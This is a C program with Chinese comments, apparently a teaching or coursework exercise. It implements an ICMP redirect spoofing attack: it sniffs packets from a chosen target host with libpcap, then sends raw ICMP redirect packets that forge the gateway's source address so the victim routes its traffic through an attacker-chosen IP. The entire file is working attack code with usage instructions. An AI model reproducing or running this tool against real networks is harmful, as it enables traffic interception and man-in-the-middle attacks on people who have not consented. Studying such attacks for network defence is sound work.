#include <pcap.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include<string.h> 
#include<sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h> 
#include <netinet/ip_icmp.h>
#include<unistd.h>


#define MAX 1024
#define SIZE_ETHERNET 14							//以太网帧首部长度

char *TARGET_IP,*REDIRECT_IP,*GW_IP;

//target_ip 要攻击的目标主机ip
//redirect_ip 重定向到一个新的ip
//gw_ip  网关ip
struct sockaddr_in target_ip, redirect_ip, gw_ip;

int flag = 0;


//ip首部
struct ip_header
{
#ifdef WORDS_BIGENDIAN  
	u_int8_t version : 4;
	u_int8_t header_length : 4;
#else  
	u_int8_t header_length : 4;						//首部长度
	u_int8_t version : 4;							//版本
#endif  
	u_int8_t tos;									//服务类型
	u_int16_t total_length;							//总长度
	u_int16_t id;									//标识
	u_int16_t frag_off;								//标志+分片偏移
	u_int8_t ttl;									//生存时间
	u_int8_t protocol;								//协议
	u_int16_t checksum;								//首部检查和
	struct in_addr source_address;					//源IP
	struct in_addr destination_address;				//目的IP
};

//icmp 重定向报文首部
struct icmp_header
{
	u_int8_t type;
	u_int8_t code;
	u_int16_t checksum;
	struct in_addr gateway_addr;					//目标路由ip
};



/*
计算校验和
buf：起始地址
len：以字节为单位的长度
*/
u_int16_t checksum(u_int8_t *buf, int len)
{
	u_int32_t sum = 0;
	u_int16_t *cbuf;

	cbuf = (u_int16_t *)buf;						

	while (len > 1)									//取16位的划分求和
	{
		sum += *cbuf++;
		len -= 2;
	}

	if (len)										//处理长度为奇时剩余的一字节
		sum += *(u_int8_t *)cbuf;

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	return ~sum;
}



/*
构造并发送重定向报文，
data：侦听到的帧数据地址
*/
void icmp_redirect(int sockfd, const unsigned char *data, int datalen)
{
	struct sockaddr_in dest;									//发包的目的地址，即攻击的目标
	struct packet {
		struct ip_header iph;									//ip首部
		struct icmp_header icmph;								//icmp重定向报文首部
		char datas[28];											//重定向报文针对的原始ip首部及数据部分前28字节
	}packet;


	//填充ip头
	packet.iph.version = 4;
	packet.iph.header_length = 5;
	packet.iph.tos = 0;											//服务类型
	packet.iph.total_length = htons(56);						//20+8+28
	packet.iph.id = getpid();									//随便填的??
	packet.iph.frag_off = 0;
	packet.iph.ttl = 255;										//生存时间设为最大
	packet.iph.protocol = IPPROTO_ICMP;							//ICMP：1    (tcp：6，udp:17)
	packet.iph.checksum = 0;									//先填入0，在进行计算
	packet.iph.source_address = gw_ip.sin_addr;					//要伪造网关发送ip报文
	packet.iph.destination_address = target_ip.sin_addr;		//将伪造重定向包发给受害者

	//填充icmp首部
	packet.icmph.type = ICMP_REDIRECT;							//类型
	packet.icmph.code = ICMP_REDIR_HOST;						//代码
	packet.icmph.checksum = 0;
	packet.icmph.gateway_addr = redirect_ip.sin_addr;			//重定向到新的路由
	
	//从源数据包的内存地址的起始地址开始，拷贝28个字节到目标地址所指的起始位置中
	//memcpy可以复制任何类型，而strcpy只能复制字符串
	//data源数据包
	//SIZE_ETHERNET 14 帧首部长度
	memcpy(packet.datas, (data + SIZE_ETHERNET), 28);

	//ip检查和仅包含首部
	packet.iph.checksum = checksum((u_int8_t *)&packet.iph, sizeof(packet.iph));
	//ICMP检查和包含首部和数据部分
	packet.icmph.checksum = checksum((u_int8_t *)&packet.icmph, sizeof(packet.icmph) + 28);

	dest.sin_family = AF_INET;									//ip地址族
	dest.sin_addr = target_ip.sin_addr;							//目标ip

	//用于非可靠连接的数据数据发送，因为UDP方式未建立SOCKET连接，所以需要自己制定目的协议地址
	//sockfd:发送端套接字描述符
	//packet:待发送数据的缓冲区
	//待发送数据长度:IP头(20)+ICMP头(8)+IP首部(20)+IP前8字节
	//flag标志位，一般为0
	//dest:数据发送的目的地址
	//地址长度
	sendto(sockfd, &packet, 56, flag, (struct sockaddr *)&dest, sizeof(dest));

	printf("a redirect packet has been sent...\n\n");
}


/*
pcap_loop()不知道如何处理返回值，所以返回值为空
第一个参数是回调函数的最后一个参数，
第二个参数是pcap.h头文件定义的，包括数据包被嗅探的时间大小等信息，最后一个参数是一个u_char指针，
它包含被pcap_loop()嗅探到的所有包（一个包包含许多属性，它不止一个字符串，而是一个结构体的集合，
如一个tcp/ip包包含以太网头部，一个ip头部还有tcp头部，还有此包的有效载荷）这个u_char就是这些结构体的串联版本。
pcap嗅探包时正是用之前定义的这些结构体
*/
void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
	int sockfd, res;   
	int one = 1;
	int *ptr_one = &one;

	//可以接收协议类型为ICMP的发往本机的IP数据包（通信的域，iPv4,套接字通信的类型，原始套接字，套接字类型，接收ICMP-》IP）
	//sockfd：socket描述符，为了以后将socket与本机端口相连
	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
	{
		printf("create sockfd error\n");
		exit(-1);
	}

	/**
	 设置sockfd套接字关联的选项
	 sockfd:指向一个打开的套接口描述字
	 IPPROTO_IP：指定选项代码的类型为IPV4套接口
	 IP_HDRINCL：详细代码名称（需要访问的选项名字）
	 ptr_one：一个指向变量的指针类型，指向选项要设置的新值的缓冲区
	 sizeof(one)：指针大小
	*/
	res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, ptr_one, sizeof(one));  
	if (res < 0)
	{
		printf("error--\n");
		exit(-3);
	}

	printf("detected a packet from the target...\n");
	//传入socket描述符，原始数据帧地址
	icmp_redirect(sockfd, packet, 0);		
}

//开启对目标主机的嗅探
int setup_sniffer(char *dev)
{
	char errbuf[PCAP_ERRBUF_SIZE];

	bpf_u_int32 mask;						//嗅探目标网络设备dev的掩码
	bpf_u_int32 net;						//目标网络设备dev的ip

	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Can't get netmask for device %s\n", dev);
		net = 0;
		mask = 0;
	}

	//打开设备进行嗅探，返回一个pcap_t类型的指针，后面操作都要用到这个指针
	pcap_t * device = pcap_open_live(dev, 65535, 1, 0, errbuf);
	if (device == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	//获得数据包捕获描述字函数（设备名称，参与定义捕获数据的最大字节数，是否置于混杂模式，
	//设置超时时间0表示没有超时等待，errBuf是出错返回NULL时用于传递错误信息）

	struct bpf_program filter;
	char filterstr[50] = { 0 };
	//将目标ip拼接到过滤字符串中
	sprintf(filterstr, "src host %s", inet_ntoa(target_ip.sin_addr));        

	//编译表达式，函数返回-1为失败，返回其他值为成功
	//device:会话句柄
	//&filter:被编译的过滤器版本的地址的引用
	//filterstr:表达式本身,存储在规定的字符串格式里
	//1:表达式是否被优化的整形量：0：没有，1：有
	//net：应用此过滤器的网络掩码
	if (pcap_compile(device, &filter, filterstr, 1, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filterstr, pcap_geterr(device));
		return(2);
	}
	
	//设置过滤器，使用这个过滤器
	pcap_setfilter(device, &filter);
	//device:会话句柄
	//&filterstr:被编译的表达式版本的引用

	printf("sniffing at %s ...\n\n", TARGET_IP);

	//device是之前返回的pacp_t类型的指针
	//-1代表循环抓包直到出错结束，>0表示循环x次，
	//最后一个参数一般之置为null
	pcap_loop(device, -1, getPacket, NULL);
	return 0;
}


int main(int argc, char * argv[])
{

	if (argc != 5) {
		printf("usage: %s target_ip redirect_ip gateway_ip sniff_dev \n", argv[0]);
		exit(1);
	}
	//inet_aton:将一个字符串IP地址转换为一个32位的网络序列IP地址
	if (inet_aton(argv[1], &target_ip.sin_addr) == 0) {
		printf("bad ip address %s\n", argv[1]);
		exit(1);
	}
	TARGET_IP = argv[1];

	if (inet_aton(argv[2], &redirect_ip.sin_addr) == 0) {
		printf("bad ip address %s\n", argv[2]);
		exit(1);
	}
	REDIRECT_IP = argv[2];

	if (inet_aton(argv[3], &gw_ip.sin_addr) == 0) {
		printf("bad ip address %s\n", argv[3]);
		exit(1);
	}
	GW_IP = argv[3];

	char * dev = argv[4];				

	printf("target:%s\n redirect:%s\n gw:%s\n dev:%s\n\n",TARGET_IP, REDIRECT_IP, GW_IP, dev);

	setup_sniffer(dev);
}

